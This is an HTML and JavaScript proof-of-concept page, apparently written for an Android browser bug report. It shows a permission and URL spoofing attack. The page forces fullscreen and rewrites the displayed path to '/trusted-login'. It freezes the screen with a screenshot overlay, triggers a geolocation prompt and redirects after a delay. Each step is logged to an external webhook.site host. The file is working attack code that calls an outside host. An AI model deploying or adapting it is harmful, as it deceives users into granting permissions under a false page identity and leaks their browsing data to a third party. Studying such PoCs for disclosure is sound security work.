<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Geo Redirect Delay PoC</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>

<body>

<button id="start">Start Demo href</button>

<script>
const TARGET = "https://google.com";
const LOG_ENDPOINT = "https://webhook.site/df32222f-b4a8-431a-872e-c4df63570c74";

let triggered = false;

// ===== LOGGER =====
function logEvent(type, extra = {}) {
  const data = {
    type,
    ts: performance.now().toFixed(3),
    epoch: Date.now(),
    url: location.href,
    origin: location.origin,
    visibility: document.visibilityState,
    readyState: document.readyState,
    ...extra
  };

  const params = new URLSearchParams(data).toString();

  // penting: pakai backticks
  new Image().src = `${LOG_ENDPOINT}?${params}`;
}

// ===== FREEZE UI =====
function freezeUI() {
  return html2canvas(document.body,{scale:2}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL();

    Object.assign(img.style,{
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });

    document.body.innerHTML="";
    document.body.appendChild(img);

    logEvent("ui_frozen");
  });
}

// ===== GEO =====
function requestGeo() {
  logEvent("geolocation_requested");

  navigator.geolocation.getCurrentPosition(
    () => logEvent("geolocation_success"),
    (err) => logEvent("geolocation_error", {code: err.code})
  );
}

// ===== REDIRECT DELAY =====
function delayedRedirect() {
  if (triggered) return;
  triggered = true;

  logEvent("returned_from_settings");

  setTimeout(() => {
    logEvent("redirecting", {target: TARGET});
location.href = TARGET;
  }, 5000);
}

// ===== EVENTS =====
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    delayedRedirect();
  }
});

window.addEventListener("focus", delayedRedirect);
window.addEventListener("pageshow", delayedRedirect);

// ===== START =====
document.getElementById("start").onclick = () => {

  logEvent("poc_started");

  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen();
  }

  history.replaceState({}, '', '/trusted-login');
  logEvent("url_spoofed");

  freezeUI().then(()=>{
    setTimeout(requestGeo, 100);
  });
};

</script>

</body>
</html>
